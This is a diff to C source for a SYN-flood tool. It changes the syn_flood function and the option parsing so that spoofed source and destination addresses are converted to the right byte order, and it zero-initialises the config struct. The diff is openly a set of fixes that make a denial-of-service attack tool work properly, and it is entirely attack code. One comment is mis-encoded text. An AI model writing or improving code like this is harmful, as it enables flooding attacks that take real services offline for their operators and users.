@@ -195,7 +195,7 @@ int syn_flood(struct synflood_config* cfg )
   memset(&DestAddr,0,sizeof(DestAddr));
   DestAddr.sin_family=AF_INET;
  // DestAddr.sin_addr.s_addr=inet_addr(SYN_DEST_IP);
-  DestAddr.sin_addr.s_addr= cfg->dip;
+  DestAddr.sin_addr.s_addr= htonl(cfg->dip);
 
   //Ìî³äIPÊ×²¿
   ip_header.h_verlen=(4<<4 | sizeof(ip_header)/sizeof(unsigned long));
@@ -318,10 +318,10 @@ int parse_option(int argc, char **argv,struct synflood_config* cfg)
 					break;
 					case 1: //sip
 						cfg->sip = inet_addr(optarg);
-						cfg->sip = htonl(cfg->sip);
+						cfg->sip = htonl(cfg->sip); //host endian
 					break;
 					case 2: //dport
-						cfg->dport = atoi(optarg);
+						cfg->dport = atoi(optarg); //host endian
 					break;
 					case 3: //sport
 						cfg->sport = atoi(optarg);
@@ -363,6 +363,7 @@ int parse_option(int argc, char **argv,struct synflood_config* cfg)
 int main(int argc,char** argv)
 {
 	struct synflood_config cfg;
+	memset(&cfg,0,sizeof(cfg));
 	cfg.dport = 8888;
 	cfg.sport = 9999;
 	cfg.dip  = inet_addr(SYN_DEST_IP);
